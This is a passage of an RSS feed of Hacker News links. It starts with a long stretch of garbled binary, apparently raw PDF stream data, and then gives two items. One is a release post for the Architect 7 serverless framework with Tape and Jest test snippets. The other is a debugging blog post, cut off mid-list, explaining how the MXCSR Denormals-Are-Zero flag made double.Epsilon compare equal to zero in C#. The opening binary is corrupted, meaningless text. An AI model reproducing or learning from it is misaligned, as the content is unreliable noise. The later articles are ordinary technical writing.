œ9ÑÕY€YgíÅõ™¹É‘tÄëÒñíå&¨v:ÍEY¤`ÍÚ[ê3S“ãÈˆÖ%ãÛÌLòìq@9DÏ©œQˆ?	oï±½Â�Vw±‘$DÑì‘ð}'&¹6�N“&á†nž™—I@×ßMZ’+M(Ÿ&MÂ5ðˆÑç¦%G’Ç°KÂ×˜–¤`JÐ’
X6M&„Ã�W¨ø"øà"FR¬KÅ×þƒˆ˜öQ5�Âå×…Þ“à)àú™òXÍnØ5Ž£!Žf—†oÝ5W8~"§ùQçšH!ž_AIDÛ.ßC�3µO‚ SDùÜÂHâøuIø–jÙSjœú }0©<&øž\CIAË._q
Aœ×¤IaÑœNÓ¯!¦]
A€Èt’ž4©}–pÎ¡
`°
€=m!seœ‹&G¶._¡	iP�çŸ Õz
·Q¯¤à-->�•”ç¤Æ–�’«•
†Üˆ¾Ä/ŠÆBÄÆ*ÓunÐùS\fP¡GÂÝ¹&lt;#pÚÚÞÙuíÛ&gt;KlÃKã¿ZÃ6GN–`çá(¼‹/8I"´hAzŸ¦±Ì» šª)X¸À&gt;ÞÕ6'=dçÿ]Ìggïí‘îÅ,lãý¹ò¹f4(Ž“L!›O8Ù¬Pô RºÍ·Ø`ñ
†›rÆjìl“ÕÀÏm\#wñ´ûdH&nbsp;ë#e¤ƒ¾s%×
Å#œ[8áÆ³¤ýC„ú*âë/¨‹ü	Õ$¸Sù…j’QLBjßT{ŒÂ°žäb²Ú?‘]ý#=¡@†u°´O))¥ …_&gt;ÍNÖš¦”;e³`*Ô®RW
›Ad¼tcw¨Ê¬SÄÔÉÃûTºät#S4è¦“uO¿é¬šar„öñ
w�“ý%ì.\»n­lA!ÈEêBgckâ~¥ÙêzÅ[è@�ˆÏ²jüÇ^iª»b…›‚QS�ÙV­+r�&amp;Xª¨[6(ô™Ó è]PåM^.ì‘S¦�v§�<rh �œx@4Äè9þ½Õ2¢rŸÐ8_€3ü¸pk@ñëâ#¾ÚÈÒ\ahwaú9é“m´&yz�vŸma¡1ä„…ÍÊymà="Àã" 4ÉÆÚæ(="" &©š•è;eîlÐ§}±³`|ÝÊØ¾ñ³ÛÏ–="" äÅøîv`¼ãp]÷="" 21n¤ýc|™þ‡Þ­búýqÎ“?öµ:áª="" ®«#ºŽo="" b“…="CõúòLÀàã,MêUµ_/}ÛË³i9`ýKuçÎˆ«kl¶«ÜG" ÔyëÏØ°kâg·z“)_Ú�û·Ú="" òÒvûÖ|ÃfÅí*è="" †³ºÏ®¸rÌ¹øµvdbû}jz$l;«ª%hØ[£ýxágpí="" ³ðbÿ“o¶k†‚lÁgÞ1aß:_|¬}g~\Àq±î�àûêf~p\úymçm5Ïï€·vŽïø-jÖr¿ý§u’oÁ,b2†›Ê?‹¦ö‚™ñ="" ©jéÓâ7ñstr�£�}«|[ÇÈ««�­Ê="" Þ÷Åzí[a“¢="" 1zø}«{Áþí[{j†ónƒ–¡'ñmÞ*k´ìw–‡`Øƒ}ÍÛÙoó“�uvb|«ÃÿÈaœ8ˆƒˆ6ó8�b¤g�jÿÞe�ß]8s…öÊ;ßŒààºoq‚&ÿ¸y#´õa‚Êžq�gqaÃ…üð="" œÄi˜Ç®ÆÙ×<c="" +ß¹x[ßï»óåb¨¯·­¥r”a="" Ç°Ü9Þ0røx´„i´…vw$ ì�h="®¦Ô¨dY€nrÿóˆÚwy9c™ì¹N7„ŸÕõ°¹Ý-¡ŽkØ�Bˆ,íâðí½“³ã¨Jê&amp;GÉ\º#î–p«ŠÂw—]ÓqãŸÍªªmûÇº=úqôx‘À_�0®‰oÿúlgøí‡—mð²ÝôVà" æƒï¶°•zà ^øïŸaÎ?="" îáòŽæÌµøˆ„'à2Ð5¡ŸÈc—cîfäÇÜïÓ -Þi\×Â¥ÿ¿<w ="" endstream="" endobj="" 168="" 0="" obj="" <<="" length="" 3180="" filter="" flatedecode="">&gt;
stream
xÚÕÙnäÆñ]_1€44ûâa »Ž7±ØÎJN¼û@qz4ÄrH™‡v'_ŸºÈ!g©µ×AbwuuwuUu]=*Ô›þ”|‹ãU´y€Æß®^Þ]}ñÊD›4ÌâØnîö›$	´b“„q’mîv›ŸƒøzkT¢ƒ¿æué+èX|âW/}[w½/ëë·wßNë~ñJg¥ÂÌ9�«F›­vai^Ð\o•Ò.xk$.(šãcÞ–]Ssÿû&lt;UÞûú†¿ûüÚ¨à	ÿ5-ƒ¾;Ý#u�o‘€/^¥›Î¢ãqWÚ˜7}Qé:Žƒ²Þ7í1ïKÜOÇ	x&nbsp;?”·:_œ‡a�¾j®áó~DõÜØ7•”õƒª²–A^ÆÚ²ï}=n¿X"�óè4hÊB&amp;5{çx &lt;ó‘q@ÜÓ#`ÀX¡/‹%Ýï¿¹½ÃV´^Úž‡úÃµ
ré0·}7yžÔ•ÿ�–
¶pöè¥�xh—÷9cËºpœ*KìÛæÈˆ?‹D¡Â[Ôn¾F•°ÉL6Æ¨0ŽŒÑ¹”»ÐŸ¹�Ö%#ê[â*aÅKîìQ+lj‚emS´ÍPï¶š¡&nbsp;QÀ/¿½Ï;Ô,÷uÑžYÖˆÒ
÷Ç²ë&nbsp;ßÝ0F+ÐiI¾ˆswh½éó¶cŒ¼[“Ôb3¸,Úe0Ósƒ9Š­GR.âhBÕ.e�ÁÏà§²6LŒý]ü¤½†NhÂX°uô}[LÙ›ÈEmJÓòXÈëÅ´âTT~;1�e¥\ªL-ÄËÂ‚
8mbt¬]¾(ßDÊ‚^W'(ÊGØ°÷zA$ÒLläà“ó©9:x¬†NZÃ}UÛwH)éþi!H±8S¨´&amp;31Ü²,VÇPÿá±ÊK¸e5-´c”#~?GŽ&amp;S`ÑçËñ†÷ºõR *
š·!7ïÈÀ!½“�CðÙÞÊ(œ
�ÒKÁ�Íõ
Û\°°g¢œ­Ñ#QïËþÐ(PžiºJÆ%b}`n©o«“¤£ÉqhrœÂûÑwx¥aš¥3cØ[‹ÞËÖµå!ò(í6$¾~}wõË•bï8º&gt;‹Æ°(¸ÉŸßF›Œ�N„@ï	ó¸1Ö…©FÎW›Û«^Á(�&nbsp;d¥ùZœ«Ífô¦°²V›áô”‰¾»F{u_ïÁ±š�4ÍZhiiåõn4yÄS�÷uÏâ$¢t(}PYYnß&amp;#�­!t.­! Ï¬!‹Ÿl!ýîîþØ±÷GÇïä3ò)@›xïÒ6]tøùÒ±°áøçM@_&gt;y¸þ`]%ÎÓ‰j¾t2[:g~pgçÑ€Ôpª»ŒÚ¡“4EàNÞñ—Îq{ñõíVéôfÖË´ôè#X»;YÀå4.É´î¯Òà!qìß×3’ª®Y3GØœ.ÅF.‚KõNnMÄ7“yÎÁÀzÑ-lOÊ@Èg	�¢ùÃbYÅ°7ü½ÀÔõ‚^›njWŸð…|g.–ïiÏ$?ø^Ø‚á3�Â�¾õõCè¸Kêó�Ü{¦Ž.÷fM{GÛÌ‡üIZ¬Ó9Sètvæ%ÝŽl*&nbsp;Á—¯‘`¨I1|è8FÈ4¢`¶ýeÈë~82ð«F&nbsp;·ÿú‘UûÙ[öÜBàR�~×ª”±Žt3;´þ�©ÛñžJJla8üžÎÛ2#Küž‰‚žsè=3ÊáG†j7n³
¿z�h7`Gî
ÈkÐvÆž¥o�ÍÇ
Ý£k@p/žÉ%°½è¥Ýñ(\ö¹\Þöò&nbsp;“¡
‘ßç…V©W56"ºŒU°*FÅÌ	ìÏ8�hƒ°±æ.Üð/¹5Ê½?KÁ_ñMaéÒ‚•reµ™�Â�ï‡‹ë"W&lt;‹þŒÉ�¢ð&amp;
uìØõ)5ó%6
�ž\ß_ÄÏ½�
³trÄ°L¦1Œá•‰ð?2;	/N�‹œ á³¡Ü«.dÀßó'ð*x˜^\ÒtgBw.÷ÒÎ�ºˆ9Àn&gt;©<d¶Ûa‚Øúè�8gi.¢qr_�"7Þfyßñ4Ð"6kØ‘À¤¼¦og~�½™Î€ ¹…%ˆm¢¿d™Ð–s—ðá°;n¶Èá´¦il="" çÒ�«†#p¼çmß«mÊù©m(v·)¹ß="">Ñ5cHµ4"b¿‰�Ï¥,Ù¦K¢Ä¥ÁðíÜÚ#ë^‘ì"öô	ÜÚóñ8M1‘ã(gÉ†È�á?´.T e½+Ñ¡‘¾BŸr1�‚}`Ë€«~´"Ø
Xóä�k°ãoÎXÏå‡K-!±(<zhØic§+jx‰s†äu^�º�¢q`aƒ(d†vÙ3 m‰“ó½ç©nfÏ0Â¹à‹“¥x–c_«ì‚Õ„¨ÁÖ¬˜ ·Ñl—½hò¨h‹€o¢4@ü¦4iÉ iÊÃŽo×}ÉÙÌj¸="" öÍÎ¬wf‰¢²ÐÄŠ‰–%Ÿ\`aþ°5ÕúÀÆt¾$Ïq:%]o"ívìi&v2¸š\d„šôlpm+‘?„�²Ù="" ø¬”½°ÜegË­b½bŒ‚ì="" …+2Û="" ldejåex{f;w.‚9ŒŸxfsØ4e"Ü…d$üíâÚbn£c6î©Õt�eúÿx`æ×¦·ÀÌm`b§0çú,þ}s¿&0#)@…i’’µ³`õ–©Š‰Æteg�Û`»w="" f€@ÿ�2¦="" Ú�lùÇœÿw¤„]ätåcç�ãaÂŸcà6ù="" ¿fïxuÉ”g“Ëþy?m1{”p4]‘Çeb#É•qdwj£nzn4Àsc±<â1¬mØ="" kl…ÙÑl÷˜cpØé="" 6ð³ÜpoÚa¬Ð’p„ž‹s�dnqá³w="" #rý$¡qô´±ôrþtp“cg@;w‡†Ò'Ëa6‚�Ç¡ž"z_0¡õîÀgÃv�¹%"µ�•–5†+="">ZÊ­SGÉ\œTeÜBÝ&nbsp;�c.Â:¿¬(Æ Ñx¼ïN÷¾ujívX°ÓUEÆ¯,†ŠqªòáÐwùýøP³XÍ9¸ùêl\t?&gt;q0É‰‰¹qO,„0n,LÞ`RN^¥ì³ÕÆ…Y–.¥ËÓ×ˆ5¡=ÛÕ};&lt;ÆÎ¬ÑªÂHgsZÓ,B²dIƒÖY“D@Òdp³Ãc§#›ÆI²f“P¥ó3£VvÆ‘m–²!d©F[­tèÒ‹ªîª6YAkþÎ´	»`¹Á·l]›&nbsp;©…6%qº®MYò+Ú”…:šØþœ"Ès“ôEBjU”¦ÜºÔ$¬~Ì5)
Èr1f²ª4ÀIw¡c¬&lt;©[“¤ÃB²�Ó§TjÙð6gí‘’ÖŠö€÷:_&gt;ÑeqªÕšöÄ¡³ñbOm¢•=ÇzTšAš~‘§Ïm	i*Dcƒ³–+ø¢9ýPƒÑçº¦Œ•5yßËì¥-6lôM”{ÿžûË"!Èi`ƒò„ò	G4wÇ[teøâ#IÿÑc�'dàähc…%FHÖ¨Æ#èÚüÁs«TÄ÷¤9� _+ä».ö_3àj°‚
ëbZçUŸ±Oi|÷yQVXóÜJéW�¢™Í8¢»:§q)ª¦£úuÎõMÞqv¢�Q^«ò½ðË¤yK“d"øSu›G¸²‡C½àJ¾L°ãP¾d0•WÆµ)œÉ%�ÈÐ9¿@RWä•ÀÉí!¨¤£—RHzö4|¢™êï.x…�¡ÅäuL€ox„¤&lt;ê¹ÍA�V­Ïw'ît(¤�Ì[Æ„qü)eÁ7ÊX)1Üƒ©yòí»²ªþÄÝÏyW×i˜èÉÂ8ûÛÃù‹ga±ã‚þýx½ðyM²É@6®c[t";?µ`�F‘Ôñ‘~•0þîßÈqü)dÑôÔ‘KÝ‡ªðÀ ¾*N†b‹ç
Á¥gCjQçÒÙëvü‡�Ô
÷~ºåïcŽqZÇ�,Ê,˜GîpX�Pmã8qÜÁ0§{`oÆ¤ó÷Ç5­äøUÅÁm&gt;¢Ý0`zFå:?ï0þ¿¿{ýSÈÍ—#ÒxI±}�§
?ÎÏûË:ä|ùnÜx½D=‰Ôj‡OZMõDÞz»¡eÊ´&lt;82_ið›�V�\€Ïñøålëiã‹&lt;-	Ïhf¡û8´ümz¿ÖNŽ�{Ð&amp;Á#28_¿_ß]ýª*ƒš
endstream
endobj
176 0 obj
&lt;&lt;</zhøic§+jx‰s†äu^�º�¢q`aƒ(d†vù3></d¶ûa‚øúè�8gi.¢qr_�"7þfyßñ4ð"6kø‘à¤¼¦og~�½™î€></rh></eó@nz½fžÿµuýò!ß`¡"bteæ\l[ûòž<¸�1`÷{§oµ�„ëì˜êá×÷yq|áã—$ê‰vq”v^?tý«3¹àô��ë¯?òú¨></f^�ýðwœþô></w¼vn²�—æï�ã¬5üº$></hp€ãžõémpñx;·h.±ë></qvñü2›7·<></m¥·wê€¡�?@däû»0ôìpwj@™€4></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cr.yp.to/papers/categories-20200918.pdf">https://cr.yp.to/papers/categories-20200918.pdf</a></em></p>]]>
            </description>
            <link>https://cr.yp.to/papers/categories-20200918.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520781</guid>
            <pubDate>Fri, 18 Sep 2020 19:13:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Architect Serverless Framework 7 released]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24520761">thread link</a>) | @nailer
<br/>
September 18, 2020 | https://blog.begin.com/architect-7-0-http-apis-and-even-better-sandbox-testing-c84df06cd443 | <a href="https://web.archive.org/web/*/https://blog.begin.com/architect-7-0-http-apis-and-even-better-sandbox-testing-c84df06cd443">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><h2 id="b68f">By popular demand: API Gateway HTTP APIs are now the default in Architect serverless apps</h2><div><div><div><p><a href="https://blog.begin.com/@ryan?source=post_page-----c84df06cd443--------------------------------" rel="noopener"><img alt="Ryan Block" src="https://miro.medium.com/fit/c/96/96/2*EfV_5cNqDQE8MFejOm6FKg.png" width="48" height="48"></a></p></div></div></div><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1996/1*w8l-oRuAMOvf6ICSmVXF4w.png" width="998" height="182" srcset="https://miro.medium.com/max/552/1*w8l-oRuAMOvf6ICSmVXF4w.png 276w, https://miro.medium.com/max/1104/1*w8l-oRuAMOvf6ICSmVXF4w.png 552w, https://miro.medium.com/max/1280/1*w8l-oRuAMOvf6ICSmVXF4w.png 640w, https://miro.medium.com/max/1400/1*w8l-oRuAMOvf6ICSmVXF4w.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*w8l-oRuAMOvf6ICSmVXF4w.png?q=20"></p></div></div></div></figure><p id="5007">OpenJSF Architect now powers thousands of serverless applications all over the world. Folks continue to tell us they value its focused, direct, stable, lock-in-free approach to building blazing fast modern web apps without ever having to manage a single server.</p><p id="caa4">Today we’re extremely excited to announce Architect 7 (Chupacabra), a major step forward in building serverless web apps and APIs with AWS.</p><p id="f7da">Chupacabra now deploys AWS API Gateway v2.0 (aka <code>HTTP</code>) APIs by default, and ships with a rewrite of Architect’s local development environment, Sandbox. The new Sandbox includes full local/offline support for building with <code>HTTP</code> APIs, and an even better interface for integrating Architect into your automated testing, from <code>tape</code> to <code>jest</code> (and everything in between).</p><p id="e527">Want to give it a go? Here’s the super quickstart, no AWS credentials required:</p><figure><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1200/1*oRk_AWfRGDx0MzXJTmeYNw.gif" width="600" height="338" srcset="https://miro.medium.com/max/552/1*oRk_AWfRGDx0MzXJTmeYNw.gif 276w, https://miro.medium.com/max/1104/1*oRk_AWfRGDx0MzXJTmeYNw.gif 552w, https://miro.medium.com/max/1200/1*oRk_AWfRGDx0MzXJTmeYNw.gif 600w" sizes="600px" data-old-src="https://miro.medium.com/freeze/max/60/1*oRk_AWfRGDx0MzXJTmeYNw.gif?q=20"></p></div></div></figure><p id="a9f0">First: <code>npm init @architect ./your-app-name</code> <br>Then: <code>npx arc sandbox<br></code><strong>That's it!</strong></p><figure><div><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1960/1*3FwfgGmDs6TR5RIpacUbYA.png" width="980" height="534" srcset="https://miro.medium.com/max/552/1*3FwfgGmDs6TR5RIpacUbYA.png 276w, https://miro.medium.com/max/1104/1*3FwfgGmDs6TR5RIpacUbYA.png 552w, https://miro.medium.com/max/1280/1*3FwfgGmDs6TR5RIpacUbYA.png 640w, https://miro.medium.com/max/1400/1*3FwfgGmDs6TR5RIpacUbYA.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*3FwfgGmDs6TR5RIpacUbYA.png?q=20"></p></div></div></div></figure><p id="8191">For most applications most of the time, we now believe <code>HTTP</code> APIs are the right way to ship a serverless app on AWS. Compared to legacy <code>REST</code> APIs, there are some compelling reasons to use (and upgrade) to <code>HTTP</code>:</p><p id="cab4">- <code>HTTP</code> APIs are designed to be lower-latency<br>- <code>HTTP</code> APIs provision and update significantly faster<br>- <code>HTTP</code> APIs are far less expensive to operate: as of this writing, they cost ≤$1.00/million requests, compared to <code>REST</code> APIs, which charge $3.50/million requests (plus data transferred)<br>- <code>HTTP</code> APIs support default stages and routes, meaning we can finally escape the dreaded API Stage Path Part Problem (e.g. <code>/staging</code> in <code><a href="https://{id}.execute-api.{region}.amazonaws.com/staging%60" rel="noopener">https://{id}.execute-api.{region}.amazonaws.com/staging</a></code>)<br>- <code>HTTP</code> APIs are where AWS is now putting the bulk of its API Gateway development effort<br>- As of September 2020, <code>HTTP</code> APIs now support authorizers (which can be implemented via <a href="https://arc.codes/primitives/macros" rel="noopener">Architect Macros</a>)</p><p id="5527">Existing Architect projects can upgrade to <code>HTTP</code> APIs with a single command; learn more in the <a href="https://arc.codes/guides/upgrade" rel="noopener">Architect upgrade guide</a>.</p><p id="3581">Architect 7 ships with a major upgrade to its local development and testing environment, <a href="https://github.com/architect/sandbox" rel="noopener">Sandbox 2.0</a>. Sandbox 2.0’s clean, unified testing interface enables granular controls for starting and stopping various local serverless services, and support for all major JS testing frameworks.</p><p id="8aa5">For example, here’s how to integrate Sandbox with two popular test libraries, <a href="https://github.com/substack/tape" rel="noopener">Tape</a> and <a href="https://jestjs.io/" rel="noopener">Jest</a>:</p><h2 id="b744">Tape</h2><pre><span id="4306">let sandbox = require('@architect/sandbox')<br>let test = require('tape)<p>test('Start the Sandbox', async t =&gt; {<br>  t.plan(1)<br>  let result = await sandbox.start()<br>  t.equal(result, 'Sandbox successfully started')<br>})</p><p>test('Tests go here', t =&gt; {<br>  // Make use of various Sandbox resources in your tests...<br>})</p><p>test('Shut down the Sandbox', async t =&gt; {<br>  t.plan(1)<br>  let result = await sandbox.end()<br>  t.equal(result, 'Sandbox successfully shut down')<br>})</p></span></pre><h2 id="ec26">Jest</h2><pre><span id="8c59">let sandbox = require('@architect/sandbox')</span><span id="261c">beforeAll(async () =&gt; {<br>  let result = await sandbox.start()<br>  expect(result).toBe('Sandbox successfully started')<br>})</span><span id="a76d">afterAll(async () =&gt; {<br>  let result = await sandbox.end()<br>  expect(result).toBe('Sandbox successfully shut down')<br>})</span><span id="f734">test('Tests go here', () =&gt; {<br>  // Make use of various Sandbox resources in your tests...<br>})</span></pre><p id="6635">Where possible, we’ve taken every possible measure to ensure a seamless upgrade to Architect 7.x from 6.x (Ogopogo) and earlier. Architect 7.x is fully backward compatible, and continues to ship API Gateway REST APIs to existing Architect projects.</p><p id="d4e0">Changes to Sandbox may require minor settings updates for local workflows, and its new testing interface does remove support for some obscure, undocumented APIs.</p><p id="4e1d">To learn more, please check out our extensive <a href="https://arc.codes/guides/upgrade" rel="noopener">Architect upgrade guide</a>.</p><p id="405a">We couldn’t do this work without the support and feedback of the Architect community, and of the folks at AWS working hard to make the future a little more serverless.</p><blockquote><p id="0890"><strong>More specifically, we’d like to give a shout out to:</strong><br>Akash Peri, Alan Tan, Khozema Ujjainwala, and the entire API Gateway team, Ali Servet Donmez, Andy Buckingham, Carter Rabasa, Fil Maj, Greg Allen, Gregor Martynus, Jordan Harband, Jory Burson, and Kris Borchers.</p></blockquote><p id="44e9">Since releasing Architect with the OpenJS Foundation, there have been over 390 releases — with many <a href="https://github.com/architect/architect/issues/new/choose" rel="noopener">more to come based on your feedback</a> and <a href="https://github.com/architect/" rel="noopener">contributions</a>.</p><p id="1c93">Oh, and don’t forget to <a href="https://architecture-as-text.slack.com/archives/C6BGT0D08/p1600199636147600" rel="noopener">join the Architect conversation in Slack</a>!</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.begin.com/architect-7-0-http-apis-and-even-better-sandbox-testing-c84df06cd443</link>
            <guid isPermaLink="false">hacker-news-small-sites-24520761</guid>
            <pubDate>Fri, 18 Sep 2020 19:11:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[When double.Epsilon can equal 0]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24520728">thread link</a>) | @maple3142
<br/>
September 18, 2020 | https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html | <a href="https://web.archive.org/web/*/https://bdach.github.io/debugging/2020/09/18/when-double-epsilon-can-equal-zero.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main" aria-label="Content">
  <div>
    <article>
      <div>
        <p>Most of the time debugging isn’t really much to write about, especially in C# land.
In a language executing on a VM, with a managed memory model, most bugs are relatively shallow and easy to fix, except for the occasional race if you’re doing multi-threading - so when suddenly it appears that comparison of doubles has stopped working correctly, all bets are off.</p>

<p>About the only options available at that point that don’t result in loss of sanity are:</p>

<ol>
  <li>give up investigating and accept that computers are fickle, unknowable machines, uncontrollable by your puny meat-based mind,</li>
  <li>spend a week of evenings looking at why the program you’re looking at apparently entirely fails at arithmetic.</li>
</ol>

<p>From the fact that this post exists, you’ve probably guessed that I went for #2.</p>



<p>It all started with <a href="https://github.com/ppy/osu/issues/9952">yet another GitHub issue</a>, in which a user reported a crash after clicking around in the <a href="https://github.com/ppy/osu">osu!lazer</a> beatmap editor.
(I won’t go into the particular details of what a beatmap editor is, as it’s mostly unimportant to the larger topic of this post.)</p>

<p>As is usual operating procedure, I, along with others, went to try to reproduce the problem on my Ubuntu install, and failed; it looked like it was going to be yet another irreproducible, and therefore inactionable, crash report.</p>

<p>The first “hail mary” came from the reporter themselves - they managed to ascertain that the crash only happened when the game was ran in single-threaded mode, and in a joint effort we’ve also managed to ascertain that it was also Windows-specific.
This already bore the signs that it was going to be an <em>interesting</em> one to deal with - especially given where the crash was located at…</p>

<p>Without going through too much unnecessary detail, the bespoke framework that osu!lazer uses has the concept of <em>bindables</em>.
A bindable is a wrapper around a value; a bindable can be, as the name suggests, <em>bound</em> to another bindable, and therefore bidirectionally receive and send value updates to and from the other bindable.
This allows showing one particular value in multiple places on the UI, and ensuring that if one instance changes, the others will follow suit.</p>

<p>For numerical bindables, backed by floating-point values, the bindables have a built-in notion of precision, to prevent changes on the order of 1e-10 firing all sorts of callbacks when they don’t really matter.
Here’s the implementation of the <code>Precision</code> property:</p>

<div><div><pre><code><span>public</span> <span>T</span> <span>Precision</span>
<span>{</span>
    <span>get</span> <span>=&gt;</span> <span>precision</span><span>;</span>
    <span>set</span>
    <span>{</span>
        <span>if</span> <span>(</span><span>precision</span><span>.</span><span>Equals</span><span>(</span><span>value</span><span>))</span>
            <span>return</span><span>;</span>

        <span>if</span> <span>(</span><span>value</span><span>.</span><span>CompareTo</span><span>(</span><span>default</span><span>)</span> <span>&lt;=</span> <span>0</span><span>)</span>
            <span>throw</span> <span>new</span> <span>ArgumentOutOfRangeException</span><span>(</span><span>nameof</span><span>(</span><span>Precision</span><span>),</span> <span>value</span><span>,</span> <span>"Must be greater than 0."</span><span>);</span>

        <span>SetPrecision</span><span>(</span><span>value</span><span>,</span> <span>true</span><span>,</span> <span>this</span><span>);</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>For some reason, on Windows, in single-threaded mode, setting <code>Precision</code> to <code>double.Epsilon</code> caused the <code>ArgumentOutOfRangeException</code> to be thrown, even though <code>double.Epsilon</code> is <em>definitively</em> larger than zero.
Debugger or no debugger, you could <em>see</em> <code>value</code> having <code>5e-324</code> in a watch and <code>default</code> being <code>0</code>, and then the branch with the throw would be taken <em>anyway</em>, almost as if the fabric of reality was slipping from right under your feet.</p>

<p>It was clearly time to leave my beloved Rider, open up the rusty (but trusty) Visual Studio and get out the disassembly window.
After having enabled native debugging in the project settings and stepping into <code>double.CompareTo()</code>, I saw the following assembly code:</p>

<div><div><pre><code>--- /_/src/System.Private.CoreLib/shared/System/Double.cs ----------------------
            if (m_value &lt; value) return -1;
00007FFA1F5307E0  sub         rsp,18h
00007FFA1F5307E4  vzeroupper
00007FFA1F5307E7  vmovsd      xmm0,qword ptr [rcx]
00007FFA1F5307EB  vucomisd    xmm1,xmm0         ; compare xmm1 to xmm0
00007FFA1F5307EF  ja          00007FFA1F53084D  ; jump if above (CF = 0, ZF = 0)
            if (m_value &gt; value) return 1;
00007FFA1F5307F1  vucomisd    xmm0,xmm1
00007FFA1F5307F5  ja          00007FFA1F53085E
            if (m_value == value) return 0;
00007FFA1F5307F7  vucomisd    xmm0,xmm1
00007FFA1F5307FB  jp          00007FFA1F5307FF  ; jump if parity (PF = 0)
00007FFA1F5307FD  je          00007FFA1F530857  ; jump if equal (ZF = 0)
</code></pre></div></div>

<p>And, sure enough, I could definitely see that the execution of these instructions differed beteween multi-threaded and single-threaded mode.
Using the “Registers” window I dumped the register state in both cases and got the following result (click screenshot below to enlarge):</p>

<p><a href="https://bdach.github.io/assets/images/lazer/mxcsr/comparison.png" target="_blank"><img src="https://bdach.github.io/assets/images/lazer/mxcsr/comparison.png" alt=""></a></p>

<p><code>xmm0</code> and <code>xmm1</code> clearly have sane and expected values in both cases, so it definitely wasn’t a mis-store.
It was the comparison <em>itself</em> that was somehow wrong - but why?</p>

<p>I quickly (and, in retrospect, stupidly) went to confirm that the issue was CPU vendor-agnostic, and got the confirmation that it happens on both Intel and AMD CPUs.
About the only meaningful discrepancy seemed to be the mystery <code>MXCSR</code> value, so it was time to investigate.</p>



<p>Before having departed on this journey, I have never really cared to look up anything about SSE/AVX registers.
Any readers that possess such knowledge have already spotted the problem in the screenshot above, but for those that presumably have never looked into anything of the sort, this section aims to be a brief recap.</p>

<p>The <code>vucomisd</code> instruction is a - watch out - <em>vectorised unordered compare of scalar double-precision floating point values</em> that happens to return its result in <code>EFLAGS</code>.
Let’s break this down further into constituent parts:</p>

<ul>
  <li>The <em>vectorised</em> part means SIMD (<em>single instruction, multiple data</em>).
SIMD instructions allow <em>data parallelisation</em> - on a concrete example, you can execute one common instruction simultaneously on <code>N</code> different values at a time.
Thankfully in this case that part isn’t really all that relevant.</li>
  <li>The <em>unordered</em> part relates to <code>NaN</code>s.
In IEEE 754 floating-point math, <code>NaN</code>s are special (and annoying) values that fail every comparison they’re part of (so a <code>NaN</code> is neither less, greater than or equal to any other number, including another <code>NaN</code>).</li>
  <li><em>Compare of scalar double-precision floating point values</em> sounds about right for what we wanted in the C# code to begin with.</li>
</ul>

<p>The result is returned in <code>EFLAGS</code>, which is a special quasi-register that is better viewed as a set of flags.
Here is the table describing the possible results of a <code>vucomisd</code> instruction:</p>

<table>
  <thead>
    <tr>
      <th>result</th>
      <th>zero flag (ZF)</th>
      <th>parity flag (PF)</th>
      <th>carry flag (CF)</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>unordered (one of operands is a <code>NaN</code>)</td>
      <td>1</td>
      <td>1</td>
      <td>1</td>
    </tr>
    <tr>
      <td>greater than</td>
      <td>0</td>
      <td>0</td>
      <td>0</td>
    </tr>
    <tr>
      <td>less than</td>
      <td>0</td>
      <td>0</td>
      <td>1</td>
    </tr>
    <tr>
      <td>equal</td>
      <td>1</td>
      <td>0</td>
      <td>0</td>
    </tr>
  </tbody>
</table>

<p>Now, the <code>MXCSR</code> register is a special <em>control register</em>, in that it <em>controls</em> how the other SSE/AVX instructions execute.
In this particular case we’re interested in two related flags, one of which will turn out to be causing the madness.</p>

<ul>
  <li>Bit 15 of the register is <em>Flush To Zero (FTZ)</em>. Setting that bit will cause <em>writes</em> of denormal floating-point values to be coerced to zero.</li>
  <li>Bit 6 of the register is <em>Denormals Are Zero (DAZ)</em>. Setting that bit will cause <em>reads</em> of denormal floating-point values to be coerced to zero.</li>
</ul>

<p>This is immediately eye-catching in this particular scenario, as coercion to zero would definitively explain the differing equality result.
However, to confirm, let’s define what a <em>denormal value</em> is (because I didn’t know either).</p>

<p>A denormal value is a floating-point value that has leading zeroes in the significand (so it’s of the form 0.00…1…).
This can only happen if the exponent of the value is all zeroes - in that case, the implicit leading 1, normally assumed for any other exponent, is swapped for a zero.
Therefore, the largest denormal double-precision value is</p>

<div><div><pre><code>0b0 0000000000 1111111111111111111111111111111111111111111111111111 = 2.225073858507201e-308
  ± |exponent| |--------------mantissa/significand----------------|
</code></pre></div></div>

<p>Because <code>double.Epsilon</code> is essentially a <code>(uint64_t)0x1</code>, it definitely <em>is</em> a denormal number.
And, sure enough, as the screenshot above demonstrates, DAZ is <em>set</em> in the single-threaded case, in which the issue reproduces.</p>

<p>Incidentally, <code>MXCSR</code> (at least on Windows) is part of the thread context, which explains why the multi-threaded mode worked fine - it’s incredibly likely that the change also occurs in multi-threaded mode, but doesn’t affect other threads, including the one that does the bogus comparison, therefore effectively “hiding” the issue.</p>

<p>That answers the immediate question of what’s going wrong, but now there’s a <em>huge</em> problem - anyone could be writing a value to a register at any time, so <em>who is</em>?</p>



<p>This is <em>about</em> the point where I started freaking out.
The obvious first step for a programmer during a freak-out is to start frantically googling around for <em>something</em> that can be related, and so I made my way over to <a href="https://github.com/dotnet/runtime"><code>dotnet/runtime</code></a> and started typing in vaguely related terms.</p>

<p>Surprise, it wasn’t an issue in the runtime itself, but I <em>did</em> find a few important clues:</p>

<ul>
  <li>
